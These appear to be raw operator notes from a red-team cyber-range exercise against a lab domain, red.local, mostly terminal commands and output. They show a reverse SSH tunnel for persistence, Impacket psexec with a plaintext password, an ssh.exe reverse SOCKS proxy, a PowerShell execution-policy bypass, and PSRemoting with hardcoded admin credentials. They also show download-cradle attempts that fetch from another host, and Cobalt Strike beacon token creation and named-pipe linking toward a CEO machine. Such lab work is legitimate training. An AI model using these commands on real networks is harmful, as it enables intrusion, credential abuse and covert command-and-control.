
```
root@jenkins:~# netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      48866/sshd: debian  
tcp        0      0 0.0.0.0:6969            0.0.0.0:*               LISTEN      48930/sshd: root    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      48928/sshd: /usr/sb 
tcp6       0      0 :::8080                 :::*                    LISTEN      40003/java          
tcp6       0      0 :::6969                 :::*                    LISTEN      48930/sshd: root    
tcp6       0      0 :::22                   :::*                    LISTEN      48928/sshd: /usr/sb 
tcp6       0      0 ::1:8081                :::*                    LISTEN      48866/sshd: debian  
udp        0      0 0.0.0.0:51023           0.0.0.0:*                           42034/openvpn       
root@jenkins:~# wget http://10.2.30.1:6969
--2025-03-09 22:50:24--  http://10.2.30.1:6969/
Connecting to 10.2.30.1:6969... connected.
HTTP request sent, awaiting response... 404 Not Found
2025-03-09 22:50:24 ERROR 404: Not Found.

```



```
ssh -N -R 10.2.30.1:6969:10.8.0.3:6969 root@10.8.0.4 -i /home/kali/cyberrange/persistence
```



```
kali@kali ~> psexec.py red.local/'HR_2205185':'TempPass123!'@10.2.10.15 -debug
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.12/site-packages/impacket
[+] StringBinding ncacn_np:10.2.10.15[\pipe\svcctl]
[*] Requesting shares on 10.2.10.15.....
[*] Found writable share ADMIN$
[*] Uploading file EpWQxdGR.exe
[*] Opening SVCManager on 10.2.10.15.....
[*] Creating service llxu on 10.2.10.15.....
[*] Starting service llxu.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.22621.525]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32> cd c:\temp
 
c:\temp> dir
 Volume in drive C is OS
 Volume Serial Number is CAD4-E5B5

 Directory of c:\temp

03/11/2025  07:23 PM    <DIR>          .
03/10/2025  04:07 AM         6,237,184 backup.exe
               1 File(s)      6,237,184 bytes
               1 Dir(s)  239,661,297,664 bytes free

c:\temp> dir
 Volume in drive C is OS
 Volume Serial Number is CAD4-E5B5

 Directory of c:\temp

03/13/2025  05:12 AM    <DIR>          .
03/10/2025  04:07 AM         6,237,184 backup.exe
03/13/2025  05:13 AM         1,264,184 ssh.exe
               2 File(s)      7,501,368 bytes
               1 Dir(s)  239,670,214,656 bytes free

c:\temp> .\ssh.exe
 
c:\temp> .\ssh.exe -R 1080 -N root@10.2.30.1 
 
c:\temp> powershell.exe -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows


PS C:\temp> 
$passwd = convertto-securestring -AsPlainText -Force -String OIJFGr4jlkgr
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "red.local\mgmtadmin",$passwd
$session = new-pssession -computername mgmt-pc-2 -credential $cred
Enter-PSSession -Session $session
PS C:\temp> $passwd = convertto-securestring -AsPlainText -Force -String OIJFGr4jlkgr
PS C:\temp> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "red.local\mgmtadmin",$passwd
PS C:\temp> $session = new-pssession -computername mgmt-pc-2 -credential $cred
PS C:\temp> Enter-PSSession -Session $session
whoami
[mgmt-pc-2]: PS C:\Users\MgmtAdmin\Documents> whoami
red\mgmtadmin
curl http://10.2.10.15:7000
whoami
[mgmt-pc-2]: PS C:\Users\MgmtAdmin\Documents> curl http://10.2.10.15:7000
[mgmt-pc-2]: PS C:\Users\MgmtAdmin\Documents> whoami
red\mgmtadmin
wget http://10.2.10.15:7000
[mgmt-pc-2]: PS C:\Users\MgmtAdmin\Documents> wget http://10.2.10.15:7000

```


```
cmd.exe /c 'powershell.exe -Command [System.Net.WebClient]::new().DownloadString("http://10.2.10.15:7000")'
```



```
cmd.exe /c 'powershell.exe -Command ps'
```


???


```
[mgmt-pc-2]: PS C:\Users\MgmtAdmin\Documents> cmd.exe /c "powershell.exe -Command Test-NetConnection -ComputerName 10.2.10.15 -Port 7000"                                                                                                    
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
ComputerName     : 10.2.10.15                                                                                                                                                                                                                
RemoteAddress    : 10.2.10.15                                                                                                                                                                                                                
RemotePort       : 7000                                                                                                                                                                                                                      
InterfaceAlias   : Ethernet                                                                                                                                                                                                                  
SourceAddress    : 10.2.20.21                                                                                                                                                                                                                
TcpTestSucceeded : True                                                                                                                                                                                                                      
                                                                                                                                                                                                                                             
```



```
[mgmt-pc-2]: PS C:\Users\MgmtAdmin\Documents> cmd.exe /c 'powershell.exe -Command "[System.Net.WebClient]::new().DownloadString(\"http://10.2.10.15:7000\")"'
cmd.exe : Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: The 

connection was 
    + CategoryInfo          : NotSpecified: (Exception calli...connection was :String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
 
closed unexpectedly."
At line:1 char:1
+ [System.Net.WebClient]::new().DownloadString("http://10.2.10.15:7000" ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException

```


```
[mgmt-pc-2]: PS C:\Users\MgmtAdmin\Documents> cmd.exe /c "powershell.exe -Command Invoke-WebRequest -Uri 'http://127.0.0.1:7000' -UseBasicParsing"
cmd.exe : Invoke-WebRequest : Unable to connect to the remote server
    + CategoryInfo          : NotSpecified: (Invoke-WebReque...e remote server:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
 
At line:1 char:1
+ Invoke-WebRequest -Uri 'http://127.0.0.1:7000' -UseBasicParsing
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc 
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
 

```


steps 
1 get a child and make a token. step 2, link mgmt-pc-2 msagent_e2

```
[03/13 14:05:18] beacon> make_token red.local\mgmtadmin OIJFGr4jlkgr
[03/13 14:05:18] [*] Tasked beacon to create a token for red.local\mgmtadmin
[03/13 14:05:19] [+] host called home, sent: 58 bytes
[03/13 14:05:20] [+] Impersonated red.local\mgmtadmin (netonly)
[03/13 14:06:01] beacon> link mgmt-pc-2 msagent_e2
[03/13 14:06:01] [*] Tasked to link to \\mgmt-pc-2\pipe\msagent_e2
[03/13 14:06:01] [+] host called home, sent: 36 bytes
[03/13 14:06:02] [+] established link to child beacon: 10.2.20.21
[03/13 14:11:28] beacon> sleep 0 [from: Beacon 10.2.20.21@8140]
[03/13 14:11:28] [*] Tasked beacon to become interactive
[03/13 14:11:30] [+] host called home, sent: 28 bytes
```


```
[03/13 19:21:07] beacon> link CEO-PC-2 msagent_e2
[03/13 19:21:07] [*] Tasked to link to \\CEO-PC-2\pipe\msagent_e2
[03/13 19:21:08] [+] host called home, sent: 143 bytes
```
